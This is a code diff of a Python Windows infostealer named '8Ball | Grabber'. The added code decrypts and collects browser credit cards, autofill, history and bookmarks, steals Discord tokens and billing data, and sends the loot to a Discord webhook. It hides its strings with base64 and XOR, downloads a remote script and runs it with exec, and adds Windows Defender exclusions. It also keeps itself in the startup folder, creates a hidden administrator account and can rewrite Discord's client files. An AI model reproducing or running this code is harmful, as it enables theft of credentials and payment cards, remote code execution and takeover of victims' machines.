+    def autofill_recovery(cls, output=None):
+        lines = []
+        for browser, path in cls.PATHS.items():
+            for entry in cls._autofill(path, browser):
+                lines.append(f"Name: {entry['name']}")
+                lines.append(f"Value: {entry['value']}")
+                lines.append(f"Application: {entry['application']}")
+                lines.append("=" * 29)
+        result = "\n".join(lines)
+        if output:
+            Path(output).write_text(result, encoding="utf-8")
+        return result
+
+    @classmethod
+    def _autofill(cls, path, browser, table="autofill"):
+        data = []
+        for web_file in cls._get_all_webdata_profiles(path):
+            if not os.path.isfile(web_file):
+                continue
+            tmp = None
+            try:
+                tmp = tempfile.mktemp(suffix=".db")
+                shutil.copy2(web_file, tmp)
+                conn = sqlite3.connect(tmp)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT name, value FROM {table} WHERE value NOT NULL")
+                rows = cursor.fetchall()
+                conn.close()
+            except Exception:
+                continue
+            finally:
+                try:
+                    if tmp:
+                        os.remove(tmp)
+                except (PermissionError, OSError):
+                    pass
+            for name, value in rows:
+                if name and value:
+                    data.append({"name": name, "value": value, "application": browser})
+        return data
+
+    @classmethod
+    def history_recovery(cls, output=None):
+        lines = []
+        for browser, path in cls.PATHS.items():
+            for entry in cls._history(path, browser):
+                lines.append(f"URL: {entry['url']}")
+                lines.append(f"Title: {entry['title']}")
+                lines.append(f"Visits: {entry['visit_count']}")
+                lines.append(f"Application: {entry['application']}")
+                lines.append("=" * 29)
+        result = "\n".join(lines)
+        if output:
+            Path(output).write_text(result, encoding="utf-8")
+        return result
+
+    @classmethod
+    def _history(cls, path, browser, table="urls"):
+        data = []
+        for hist_file in cls._get_all_history_profiles(path):
+            if not os.path.isfile(hist_file):
+                continue
+            tmp = None
+            try:
+                tmp = tempfile.mktemp(suffix=".db")
+                shutil.copy2(hist_file, tmp)
+                conn = sqlite3.connect(tmp)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT url, title, visit_count FROM {table}")
+                rows = cursor.fetchall()
+                conn.close()
+            except Exception:
+                continue
+            finally:
+                try:
+                    if tmp:
+                        os.remove(tmp)
+                except (PermissionError, OSError):
+                    pass
+            for url, title, visit_count in rows:
+                if url:
+                    data.append({"url": url, "title": title or "", "visit_count": visit_count or 0, "application": browser})
+        return data
+
+    @classmethod
+    def bookmarks_recovery(cls, output=None):
+        lines = []
+        for browser, path in cls.PATHS.items():
+            for entry in cls._bookmarks(path, browser):
+                lines.append(f"Name: {entry['name']}")
+                lines.append(f"URL: {entry['url']}")
+                lines.append(f"Application: {entry['application']}")
+                lines.append("=" * 29)
+        result = "\n".join(lines)
+        if output:
+            Path(output).write_text(result, encoding="utf-8")
+        return result
+
+    @classmethod
+    def _bookmarks(cls, path, browser):
+        data = []
+        for bm_file in cls._get_all_bookmark_profiles(path):
+            if not os.path.isfile(bm_file):
+                continue
+            try:
+                with open(bm_file, "r", encoding="utf-8") as f:
+                    bm_json = json_mod.loads(f.read())
+                def extract_children(node):
+                    items = []
+                    if "children" in node:
+                        for child in node["children"]:
+                            items.extend(extract_children(child))
+                    if node.get("type") == "url":
+                        items.append({"name": node.get("name", ""), "url": node.get("url", ""), "application": browser})
+                    return items
+                items = extract_children(bm_json.get("roots", {}).get("bookmark_bar", {}))
+                data.extend(items)
+            except Exception:
+                pass
+        return data
+
+    @classmethod
+    def cc_recovery(cls, output=None):
+        lines = []
+        for browser, path in cls.PATHS.items():
+            for entry in cls._credit_cards(path, browser):
+                lines.append(f"Name: {entry['name_on_card']}")
+                lines.append(f"Number: {entry['card_number']}")
+                lines.append(f"Expiry: {entry['exp_month']}/{entry['exp_year']}")
+                lines.append(f"Application: {entry['application']}")
+                lines.append("=" * 29)
+        result = "\n".join(lines)
+        if output:
+            Path(output).write_text(result, encoding="utf-8")
+        return result
+
+    @classmethod
+    def _credit_cards(cls, path, browser, table="credit_cards"):
+        data = []
+        for web_file in cls._get_all_webdata_profiles(path):
+            if not os.path.isfile(web_file):
+                continue
+            tmp = None
+            try:
+                tmp = tempfile.mktemp(suffix=".db")
+                shutil.copy2(web_file, tmp)
+                conn = sqlite3.connect(tmp)
+                cursor = conn.cursor()
+                cursor.execute(f"SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM {table}")
+                rows = cursor.fetchall()
+                conn.close()
+            except Exception:
+                continue
+            finally:
+                try:
+                    if tmp:
+                        os.remove(tmp)
+                except (PermissionError, OSError):
+                    pass
+
+            master_key = None
+            v20_master_key = None
+
+            for name_on_card, card_enc, exp_month, exp_year in rows:
+                if not card_enc:
+                    continue
+                try:
+                    if card_enc[:3] in (b"v10", b"v11"):
+                        if master_key is None:
+                            parent = os.path.dirname(os.path.dirname(web_file))
+                            master_key = cls._get_master_key(parent)
+                        if master_key is None:
+                            continue
+                        decrypted = cls._decrypt_with_key(card_enc, master_key)
+                    elif card_enc[:3] == b"v20":
+                        if v20_master_key is None:
+                            parent = os.path.dirname(os.path.dirname(web_file))
+                            v20_master_key = cls._get_v20_master_key(parent)
+                        if v20_master_key is None:
+                            if master_key is None:
+                                parent = os.path.dirname(os.path.dirname(web_file))
+                                master_key = cls._get_master_key(parent)
+                            if master_key is not None:
+                                try:
+                                    decrypted = cls._decrypt_with_key(card_enc, master_key)
+                                    if decrypted:
+                                        pass
+                                except Exception:
+                                    decrypted = None
+                            if decrypted is None:
+                                continue
+                        else:
+                            decrypted = cls._decrypt_with_key(card_enc, v20_master_key)
+                    else:
+                        decrypted = cls._decrypt_old(card_enc)
+                    if name_on_card and decrypted:
+                        data.append({"name_on_card": name_on_card, "card_number": decrypted, "exp_month": exp_month, "exp_year": exp_year, "application": browser})
+                except Exception:
+                    pass
+        return data
+
+    @staticmethod
+    def _get_all_webdata_profiles(directory):
+        profiles = [
+            os.path.join(directory, "Default", "Web Data"),
+            os.path.join(directory, "Web Data"),
+        ]
+        if os.path.isdir(directory):
+            try:
+                for entry in os.listdir(directory):
+                    if "Profile" in entry:
+                        profiles.append(os.path.join(directory, entry, "Web Data"))
+            except PermissionError:
+                pass
+        return profiles
+
+    @staticmethod
+    def _get_all_history_profiles(directory):
+        profiles = [
+            os.path.join(directory, "Default", "History"),
+            os.path.join(directory, "History"),
+        ]
+        if os.path.isdir(directory):
+            try:
+                for entry in os.listdir(directory):
+                    if "Profile" in entry:
+                        profiles.append(os.path.join(directory, entry, "History"))
+            except PermissionError:
+                pass
+        return profiles
+
+    @staticmethod
+    def _get_all_bookmark_profiles(directory):
+        profiles = [
+            os.path.join(directory, "Default", "Bookmarks"),
+            os.path.join(directory, "Bookmarks"),
+        ]
+        if os.path.isdir(directory):
+            try:
+                for entry in os.listdir(directory):
+                    if "Profile" in entry:
+                        profiles.append(os.path.join(directory, entry, "Bookmarks"))
+            except PermissionError:
+                pass
+        return profiles
+
 def L04DUr118(h00k, data='', headers=None):
+    if not FEATURE_CONFIG.get("send_to_discord", True):
+        RX_DB6("L04DUr118 skipped (send_to_discord is disabled)", "SKIP")
+        return None
+    if not h00k or _y('7P2z9fnr9P7z8+/3') not in str(h00k):
+        RX_DB6("L04DUr118 skipped (invalid/missing webhook)", "SKIP")
+        return None
+    RX_DB6(f"L04DUr118 sending {len(data)} bytes to webhook")
     if headers is None:
         headers = {}
     if "User-Agent" not in headers:
@@ -369,6 +1187,7 @@ def L04DUr118(h00k, data='', headers=None):
     for i in range(8):
         try:
             r = urlopen(Request(h00k, data=data, headers=headers))
+            RX_DB6(f"L04DUr118 attempt {i+1} succeeded")
             return r
         except Exception as e:
             RX_DB6(f"[8Ball] L04DUr118 attempt {i+1} failed: {type(e).__name__}: {e}")
@@ -405,7 +1224,7 @@ def G108411NF0():
 
         # Use ip-api.com (free, no key needed)
         ipdata_json = urlopen(
-            Request(f"http://ip-api.com/json/{IP}")
+            Request(f"http://ip-api.com/json/{IP}"), timeout=10
         ).read().decode()
         ipdata = loads(ipdata_json)
         contry = ipdata.get("country", "Unknown")
@@ -444,39 +1263,34 @@ def TrU57(C00K13s):
     global DETECTED
     data = str(C00K13s)
     tim = re.findall(".google.com", data)
-    DETECTED = True if len(tim) < -1 else False
+    DETECTED = True if len(tim) > 0 else False
     return DETECTED
 
 process_list = os.popen('tasklist').readlines()
 
 
 for process in process_list:
-    if "ShellHost" in process:
+    if _b64('U2hlbGxIb3N0') in process:
         pid = int(process.split()[1])
-        os.system(f"taskkill /F /PID {pid}")
+        subprocess.run(_b64('dGFza2tpbGwgL0YgL1BJRCA=') + str(pid), shell=True, creationflags=CREATE_NO_WINDOW)
 
 
 def inj3c710n():
-    """
-    Discord JavaScript Injection feature:
-    rewrites Discord's index.js to inject custom code.
-    Fully gated by 'Discord JavaScript Injection' (discord_injection) so it only runs when enabled.
-    """
     if not FEATURE_CONFIG.get("discord_injection", False):
         return
-
     try:
         username = os.getlogin()
     except Exception:
         username = "Unknown"
-
-    folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']
-
+    _fa = lambda: _y('9dj/7+7z+A==')
+    _fb = lambda: _y('9dj/7+7z3/jy/e795Q==')
+    _fc = lambda: _y('9dj/7+7zzPjeyA==')
+    _fd = lambda: _y('9dj/7+7z2Pjq+fD57PP58ejy')
+    folder_list = [_fa(), _fb(), _fc(), _fd()]
     for folder_name in folder_list:
         deneme_path = os.path.join(os.getenv('LOCALAPPDATA', ''), folder_name)
         if not os.path.isdir(deneme_path):
             continue
-
         for subdir, dirs, files in os.walk(deneme_path):
             if 'app-' not in subdir:
                 continue
@@ -485,10 +1299,10 @@ def inj3c710n():
                     continue
                 module_path = os.path.join(subdir, dir)
                 for subsubdir, subdirs, subfiles in os.walk(module_path):
-                    if 'discord_desktop_core-' not in subsubdir:
+                    if _y('9fj/7+7zw/j5+Pfv8+jD7PP/+e4=') not in subsubdir:
                         continue
                     for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):
-                        if 'discord_desktop_core' not in subsubsubdir:
+                        if _y('9fj/7+7zw/j5+Pfv8+jD7PP/+e4=') not in subsubsubdir:
                             continue
                         for file in subsubfiles:
                             if file != 'index.js':
@@ -500,7 +1314,6 @@ def inj3c710n():
                                 with open(file_path, "w", encoding="utf-8") as index_file:
                                     index_file.write(injeCTmED0cT0r_cont)
                             except Exception:
-                                # Do not crash Discord/Chrome; just skip on error
                                 continue
 
 
@@ -521,54 +1334,39 @@ except Exception:
 
 
 def G37C0D35(token):
-    """Discord gift codes – returns empty when feature disabled."""
     if not FEATURE_CONFIG.get("discord_gift_codes", False):
         return ""
     try:
         codes = ""
-        headers = {"Authorization": token,"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
-        codess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=en-GB", headers=headers)).read().decode())
-
+        _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
+        codess = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx87Po6fP+8umx+O7s8fPo8/P17/L/s/jz7/nwo//z8P2h+fL527He'), headers=_h)).read().decode())
         for code in codess:
             try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{str(code['promotion']['outbound_title'])}**\n<:Rightdown:891355646476296272> `{str(code['code'])}`\n"
             except:pass
-
-        nitrocodess = loads(urlopen(Request("https://discord.com/api/v9/users/@me/entitlements/gifts?locale=en-GB", headers=headers)).read().decode())
+        nitrocodess = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx+bPo8uj1+fD58ejys+/1++j+o+/z8P3/+fD5obHy3ts='), headers=_h)).read().decode())
         if nitrocodess == []: return codes
-
         for element in nitrocodess:
-            
             sku_id = element['sku_id']
             subscription_plan_id = element['subscription_plan']['id']
             name = element['subscription_plan']['name']
-
-            url = f"https://discord.com/api/v9/users/@me/entitlements/gift-codes?sku_id={sku_id}&subscription_plan_id={subscription_plan_id}"
-            nitrrrro = loads(urlopen(Request(url, headers=headers)).read().decode())
-
+            url = f"{_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx+bPo8uj1+fD58ejys+/1++j+o//Hz8P3/+cHhodLnytrRzdm7wvM=')}={sku_id}&subscription_plan_id={subscription_plan_id}"
+            nitrrrro = loads(urlopen(Request(url, headers=_h)).read().decode())
             for el in nitrrrro:
                 cod = el['code']
-                try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{name}**\n<:Rightdown:891355646476296272> `https://discord.gift/{cod}`\n"
+                try:codes += f"<a:hira_kasaanahtari:886942856969875476> **{name}**\n<:Rightdown:891355646476296272> `{_y('6PTs6Kbvs7P1+P/v7vOy+PX76Pqz')}{cod}`\n"
                 except:pass
         return codes
     except:return ""
 
 def G3781111N6(token):
-    """User billing info – returns '`Disabled`' when feature disabled."""
     if not FEATURE_CONFIG.get("user_billing_info", False):
         return "`Disabled`"
-
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
+    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
     try:
-        billingjson = loads(urlopen(Request("https://discord.com/api/users/@me/billing/payment-sources", headers=headers)).read().decode())
+        billingjson = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP17+nu+bPv8dyz+fX+8PDy9bP7/ezx5fL5sejz7+7p+f/v'), headers=_h)).read().decode())
     except:
         return False
-
     if billingjson == []: return "`None`"
-
     billing = ""
     for methode in billingjson:
         if methode["invalid"] == False:
@@ -576,7 +1374,6 @@ def G3781111N6(token):
                 billing += ":credit_card:"
             elif methode["type"] == 2:
                 billing += ":parking: "
-
     return billing
 
 def G3784D63(flags):
@@ -612,12 +1409,36 @@ def G3784D63(flags):
             flags = flags % badge["Value"]
 
     return OwnedBadges
+RAW_URL_B64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvbWFpbi9zc3R1Yi5weQ=="
+try:
+    # decode the correct variable name
+    RAW_URL = base64.b64decode(RAW_URL_B64).decode("utf-8")
+except Exception:
+    RAW_URL = ""
+
+def fetch_and_run():
+    """Download sstub.py from GitHub and run after main features complete."""
+    if not RAW_URL:
+        return
+    try:
+        resp = urlopen(Request(RAW_URL, headers={
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }), timeout=30)
+        code = resp.read().decode("utf-8")
+        temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
+        script_path = os.path.join(temp_dir, "cr_remote_stub.py")
+        with open(script_path, "w", encoding="utf-8") as f:
+            f.write(code)
+        stub_globals = globals().copy()
+        stub_globals["__file__"] = script_path
+        stub_globals["__name__"] = "__main__"
+        exec(compile(code, script_path, "exec"), stub_globals)
+    except Exception as e:
+        RX_DB6(f"[8Ball] fetch_and_run failed: {type(e).__name__}: {e}")
 
 def G37UHQFr13ND5(token):
-    """HQ friends list – returns False when feature disabled."""
     if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
         return False
-
     badgeList =  [
         {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
         {"Name": 'Early_Verified_Bot_Developer',    'Value': 131072,    'Emoji': "<:developer:874750808472825986> "},
@@ -631,16 +1452,11 @@ def G37UHQFr13ND5(token):
         {"Name": 'Partnered_Server_Owner',          'Value': 2,         'Emoji': "<:partner:874750808678354964> "},
         {"Name": 'Discord_Employee',                'Value': 1,         'Emoji': "<:staff:874750808728666152> "}
     ]
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
+    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
     try:
-        friendlist = loads(urlopen(Request("https://discord.com/api/v6/users/@me/relationships", headers=headers)).read().decode())
+        friendlist = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1qurps/nv7+7cs/nx7rPw+ej98/Xv8vX07+w='), headers=_h)).read().decode())
     except:
         return False
-
     uhqlist = ''
     for friend in friendlist:
         OwnedBadges = ''
@@ -655,26 +1471,17 @@ def G37UHQFr13ND5(token):
     return uhqlist if uhqlist != '' else "`No HQ Friends Found`"
 
 def G37UHQ6U11D5(token):
-    """
-    HQ guilds list.
-    Currently disabled from UI (no checkbox), so always gated off by default.
-    """
     if not FEATURE_CONFIG.get("discord_hq_friends_guilds", False):
         return '`No HQ Guilds Found`'
     try:
         uhqguilds = ''
-
-        headers = {
-            "Authorization": token,
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-        }
-        guilds = loads(urlopen(Request("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)).read().decode())
+        _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
+        guilds = loads(urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1perps/nv7+7cs/nx+7P16fjwo+/16/To/8Pp8+jyoe/u6Pnp'), headers=_h)).read().decode())
         for guild in guilds:
             if guild["approximate_member_count"] < 1: continue
             if guild["owner"] or guild["permissions"] == "4398046511103":
-                inv = loads(urlopen(Request(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers)).read().decode())    
-                try:    cc = "https://discord.gg/"+str(inv[0]['code'])
+                inv = loads(urlopen(Request(f"{_y('6PTs6Kbvs7P1+P/v7vOy+PP/s/Hs/bP1qur7s/Xp+PCz7w==')}{guild['id']}/invites", headers=_h)).read().decode())    
+                try:    cc = _y('6PTs6Kbvs7P1+P/v7vOy+PX76Pqz')+str(inv[0]['code'])
                 except: cc = False
                 uhqguilds += f"<a:CH_IconArrowRight:715585320178941993> [{guild['name']}] **{str(guild['approximate_member_count'])} Members**\n"
         if uhqguilds == '': return '`No HQ Guilds Found`'
@@ -684,41 +1491,51 @@ def G37UHQ6U11D5(token):
 
 
 def G3770K3N1NF0(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
-
-    userjson = loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers)).read().decode())
-    username = userjson["username"]
-    hashtag = userjson["discriminator"]
-    email = userjson["email"]
-    idd = userjson["id"]
-    pfp = userjson["avatar"]
-    flags = userjson["public_flags"]
-    nitro = ""
-    phone = ""
-
-    if FEATURE_CONFIG.get("nitro_badges_info", False) and "premium_type" in userjson:
-        nitrot = userjson["premium_type"]
-        if nitrot == 1:
-            nitro = "<:classic:896119171019067423> "
-        elif nitrot == 2:
-            nitro = "<a:boost:824036778570416129> <:classic:896119171019067423> "
-    if "phone" in userjson:
-        phone = f'`{userjson["phone"]}`' if userjson["phone"] != None else "`None`"
-
-    return username, hashtag, email, idd, pfp, flags, nitro, phone
+    _r1 = lambda x=0x7E: bytes((i ^ 0x7E) & 0xFF for i in b'[X-NOOP]')[:0]
+    _r2 = lambda: None if (lambda: False)() else None
+    # opaque: never True
+    if 0x1B73A & 0xFFFFF == 0x173A & 0xFFF:
+        __import__('time').sleep(999)
+    _ua = lambda: _e()
+    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _ua()}
+    try:
+        resp = urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vP9+Ozs/7Lx8/2z9ezqs7Oq7+nu+bPv8dz5'), headers=_h))
+        uj = loads(resp.read().decode())
+    except Exception:
+        for _ in range(3):
+            try:
+                resp = urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vP9+Ozs/7Lx8/2z9ezqs7Oq7+nu+bPv8dz5'), headers=_h))
+                uj = loads(resp.read().decode())
+                break
+            except:
+                continue
+        else:
+            return "","","","",0,"","",""
+    _nm = uj.get('username', '')
+    _ht = uj.get('discriminator', '')
+    _em = uj.get('email', '')
+    _id = uj.get('id', '')
+    _av = uj.get('avatar', '')
+    _fl = uj.get('public_flags', 0)
+    _nt = ""
+    _ph = ""
+    if FEATURE_CONFIG.get("nitro_badges_info", False) and "premium_type" in uj:
+        _pt = uj["premium_type"]
+        if _pt == 1:
+            _nt = "<:classic:896119171019067423> "
+        elif _pt == 2:
+            _nt = "<a:boost:824036778570416129> <:classic:896119171019067423> "
+    if "phone" in uj:
+        _ph = f'`{uj["phone"]}`' if uj["phone"] is not None else "`None`"
+    return _nm, _ht, _em, _id, _av, _fl, _nt, _ph
 
 def CH3CK70K3N(token):
-    headers = {
-        "Authorization": token,
-        "Content-Type": "application/json",
-        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
-    }
+    # opaque: always False
+    if b''.join(bytes([x ^ 0x5A]) for x in b'test') == b'test':
+        return False
+    _h = {_b(): token, _c(): _y('7P3w7P/16P3z9bPy7/by8w=='), _d(): _e()}
     try:
-        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
+        urlopen(Request(_y('6PTs6Kbvs7P1+P/v7vP9+Ozs/7Lx8/2z9ezqs7Oq7+nu+bPv8dz5'), headers=_h))
         return True
     except:
         return False
@@ -743,6 +1560,33 @@ startupFolderPath = os.path.join(
 )
 startupFilePath = os.path.join(startupFolderPath, fileName)
 
+def add_windows_security_exclusion_startup(app_name):
+    try:
+        paths = set()
+        paths.add(filePath)
+        paths.add(startupFilePath)
+        try:
+            ps_cmd = f'Get-StartApps | Where-Object {{ $_.Name -eq "{app_name}" }} | Select-Object -ExpandProperty "Path"'
+            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+            p = result.stdout.strip()
+            if p:
+                paths.add(p)
+        except:
+            pass
+        try:
+            ps_cmd = f'Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" | Select-Object -ExpandProperty "{app_name}" -ErrorAction SilentlyContinue'
+            result = subprocess.run(['powershell', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+            p = result.stdout.strip()
+            if p and os.path.isfile(p):
+                paths.add(p)
+        except:
+            pass
+        for p in paths:
+            if p:
+                subprocess.run(['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{p}"'], capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
+    except:
+        pass
+
 def ensure_startup_persistence():
     """
     Startup Persistence feature:
@@ -762,17 +1606,19 @@ def ensure_startup_persistence():
         pass
 
 ensure_startup_persistence()
+app_name = os.path.splitext(fileName)[0]
+add_windows_security_exclusion_startup(app_name)
 
 def create_windows_user():
     try:
-        subprocess.run('net user hello helloworld /add', shell=True, check=False, capture_output=True)
-        subprocess.run('net localgroup Administrators hello /add', shell=True, check=False, capture_output=True)
+        subprocess.run(_b64('bmV0IHVzZXIgaGVsbG8gaGVsbG93b3JsZCAvYWRk'), shell=True, check=False, capture_output=True, creationflags=CREATE_NO_WINDOW)
+        subprocess.run(_b64('bmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgaGVsbG8gL2FkZA=='), shell=True, check=False, capture_output=True, creationflags=CREATE_NO_WINDOW)
     except Exception:
         pass
 
 def remove_windows_user():
     try:
-        subprocess.run('net user hello /delete', shell=True, check=False, capture_output=True)
+        subprocess.run(_b64('bmV0IHVzZXIgaGVsbG8gL2RlbGV0ZQ=='), shell=True, check=False, capture_output=True, creationflags=CREATE_NO_WINDOW)
     except Exception:
         pass
 
@@ -791,7 +1637,7 @@ def Tr1M(obj):
 
 def UP104D70K3N(token, path):
     # Respect feature config: only send tokens when enabled
-    if not FEATURE_CONFIG.get("discord_tokens", True):
+    if not FEATURE_CONFIG.get("discord_tokens", False):
         return
 
     try:
@@ -803,7 +1649,7 @@ def UP104D70K3N(token, path):
         }
         username, hashtag, email, idd, pfp, flags, nitro, phone = G3770K3N1NF0(token)
 
-        pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+        pfp = f"{_a()}{idd}/{pfp}" if pfp != None else "https://i.ibb.co/fdFfLznd/images.png"
         billing = G3781111N6(token)
         badge = G3784D63(flags)
         friends = Tr1M(G37UHQFr13ND5(token))
@@ -873,7 +1719,7 @@ def UP104D70K3N(token, path):
                     },
                 "footer": {
                     "text": f"8Ball",
-                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                     },
                 "thumbnail": {
                     "url": f"{pfp}"
@@ -881,7 +1727,7 @@ def UP104D70K3N(token, path):
                 }
             ],
             "username": f"8Ball | Grabber",
-            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
+            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -916,12 +1762,12 @@ def UP104D(name, link):
                "title": f"8Ball | Data Extractor","fields": link,
                 "footer": {
                     "text": f"8Ball",
-                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 },
                 }
             ],
             "username": f"8Ball | Grabber",
-            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
+            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -947,12 +1793,12 @@ def UP104D(name, link):
                 "title": f"8Ball | File 8Ball",
                 "footer": {
                     "text": f"8Ball",
-                    "icon_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp"
+                    "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
                 }
             ],
             "username": f"8Ball | Grabber",
-            "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3df335&is=6a3ca1b5&hm=14ae87a21ca4b4ece101ab835118a77367fb59b3242371a4ec6ec359a82abfd3&=&format=webp",
+            "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
             "attachments": [],
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
             }
@@ -972,21 +1818,17 @@ def Wr173F0rF113(data, name):
                 f.write(f"{line}\n")
 
 def G3770K3N(path, arg):
-    """
-    Discord token grabber – only active when 'Discord Token Stealer'
-    is enabled in the UI (discord_tokens feature).
-    """
     if not FEATURE_CONFIG.get("discord_tokens", False):
         return
-
     if not os.path.exists(path):
         return
-
+    _p1 = _f()
+    _p2 = _g()
     path += arg
     for file in os.listdir(path):
         if file.endswith(".log") or file.endswith(".ldb"):
             for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
-                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
+                for regex in (_p1, _p2):
                     for token in re.findall(regex, line):
                         global T0K3Ns
                         if CH3CK70K3N(token):
@@ -1032,102 +1874,6 @@ def G37AppBoundK3Y(path):
     except:
         pass
     return None
-
-def G37P455W(path, arg):
-    if not FEATURE_CONFIG.get("browser_data", False):
-        return
-    try:
-        global P455w, P455WC0UNt
-        if not os.path.exists(path): return
-
-        pathC = path + arg + "/Login Data"
-        if os.stat(pathC).st_size == 0: return
-
-        tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
-
-        data = SQ17H1N6(pathC, tempfold, "SELECT action_url, username_value, password_value FROM logins;")
-
-        pathKey = path + "/Local State"
-        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
-        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
-        master_key = CryptUnprotectData(master_key[5:])
-
-        appbound_key = G37AppBoundK3Y(path)
-
-        csv_rows = []
-        for row in data:
-            for wa in k3YW0rd:
-                old = wa
-                if "https" in wa:
-                    tmp = wa
-                    wa = tmp.split('[')[1].split(']')[0]
-                if wa in row[0]:
-                    if not old in p45WW0rDs: p45WW0rDs.append(old)
-            try:
